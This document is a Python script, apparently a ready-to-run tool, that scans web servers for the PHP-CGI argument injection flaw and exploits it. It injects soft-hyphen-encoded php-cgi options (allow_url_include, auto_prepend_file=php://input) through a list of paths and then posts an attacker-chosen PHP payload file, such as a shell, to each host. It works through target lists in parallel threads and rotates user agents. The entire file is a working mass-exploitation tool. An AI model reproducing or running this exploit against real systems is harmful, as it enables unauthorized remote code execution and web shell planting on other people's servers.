import argparse
import requests
from colorama import init, Fore, Style
import random
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
]

paths = [
    '/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/unfxu9a.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/php-cgi/unfxu9a.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/php-cgi/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/cgi-bin/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/index.test?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/test.hello?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/unfxu9a.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/php-cgi/unfxu9a.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/cgi-bin/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/php-cgi/php.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/cgi-bin/php.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/index.test?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    '/test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
]

def get_random_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def scan_for_vulnerability(target_url):
    for path in paths:
        try:
            url = f"{target_url}{path}"
            headers = get_random_headers()
            response = requests.post(url, data="echo 'Alhadmin'; die;", headers=headers, timeout=5)
            
            if 'Alhadmin' in response.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] Target {target_url} is vulnerable at {path}{Style.RESET_ALL}")
                append_to_file("vulnerability.txt", f"{target_url}{path}")
                return True
        except requests.exceptions.RequestException:
            continue
    print(f"{Fore.LIGHTYELLOW_EX}[-] Target {target_url} is not vulnerable{Style.RESET_ALL}")
    append_to_file("novulnerability.txt", target_url)
    return False

def exploit(target_url, payload_file):
    for path in paths:
        try:
            url = f"{target_url}{path}"
            headers = get_random_headers()
            
            with open(payload_file, 'r') as file:
                php_payload = file.read()
            
            response = requests.post(url, data=php_payload, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print(f'{Fore.GREEN}[+] Exploit successful for {target_url} at {path}!')
                return
            else:
                print(f'{Fore.RED}[!] Exploit may have failed for {target_url} at {path}.')
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Error with {target_url} at {path}: {e}")

def append_to_file(filename, target):
    with open(filename, "a") as file:
        file.write(target + "\n")

def process_target(target, scan, exploit_flag, payload_file):
    if scan:
        scan_for_vulnerability(target)
    
    if exploit_flag and payload_file:
        exploit(target, payload_file)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RCE: PHP CGI Argument Injection Scanner and Exploit")
    parser.add_argument('-t', '--target', dest='target', help='Single Target URL (e.g., http://example.com)')
    parser.add_argument('-l', '--list', dest='target_list', help='File with list of target URLs (e.g., list.txt)')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan for the vulnerability only')
    parser.add_argument('-e', '--exploit', action='store_true', help='Exploit the vulnerability after scanning')
    parser.add_argument('-p', '--payload', dest='payload_file', help='PHP payload file to execute (e.g., shell.php)')
  
    args = parser.parse_args()

    if not any([args.target, args.target_list]):
        parser.error('Please provide a target URL (--target) or a file with a list of targets (--list)')

    targets = []
    if args.target:
        targets.append(args.target.rstrip('/'))
    if args.target_list:
        with open(args.target_list, 'r') as f:
            targets.extend(line.strip().rstrip('/') for line in f if line.strip())

    with ThreadPoolExecutor() as executor:
        for target in targets:
            executor.submit(process_target, target, args.scan, args.exploit, args.payload_file)
